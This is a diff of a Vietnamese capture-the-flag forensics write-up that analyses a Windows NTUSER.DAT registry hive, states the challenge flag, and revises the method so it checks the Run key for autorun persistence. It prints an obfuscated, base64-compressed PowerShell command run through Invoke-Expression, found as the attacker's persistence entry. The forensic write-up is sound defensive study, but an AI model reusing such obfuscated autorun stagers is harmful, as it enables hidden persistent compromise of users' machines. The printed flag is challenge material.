@@ -23,12 +23,12 @@ NTUSER.DAT: MS Windows registry file, NT/2000 or above
 > Flag : `CHH{N0_4_go_n0_st4r_wh3r3}`
 ### Cách 2
 - Vì trong thực tế không thể tìm kiếm bằng cách tìm cmd.exe hay powershell.exe nên em sẽ làm 1 cách khác 
-- Tương tự như cách 1, vì đây là file registry nên em mở nó bằng `registry explorer` 
-- Dựa theo kiến thức đã học ở lab `https://tryhackme.com/room/windowsforensics1` em sẽ tìm kiếm theo phương pháp thủ công 
-- Vì đề bài có gợi ý là máy tính của Hoà bị hack nên đầu tiên em phải xác định các file được thực thi trước tại `\Software\Microsoft\Windows\Currentversion\count` 
-- ![image](image/6.PNG)
-- Ở đây có cmd.exe và powershell.exe đang chạy 
-- Lướt xuống 1 tí tại \run em thấy powershell đang thực hiện 1 lệnh
+- Theo đề bài ta có máy tính của Hoà bị hack, khả ngăng cao các tệp của hacker sẽ tự động thực thi kể từ lúc user đăng nhập (đây là tính năng auto run của windows)
+- Một vài tài liệu được em thu thập [ở đây](https://tientrieu.net/639-virus-autorun-la-gi.html)
+- Chương trình tự khởi động được lưu như sau:
+- ![image](image/7.PNG)
+- Sau khi truy cập vào `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run` em thấy 1 đoạn shell được tự động chạy từ powershell
+- ![image](image/8.PNG)
 ``` 
 "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "(neW-obJEct io.COMprEssIon.dEFlATesTReAm( [sySTem.IO.memorYSTREam] [coNVeRT]::FRoMBAse64stRInG( 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='), [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)|FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()|inVOKe-exprEsSIon"
 ```
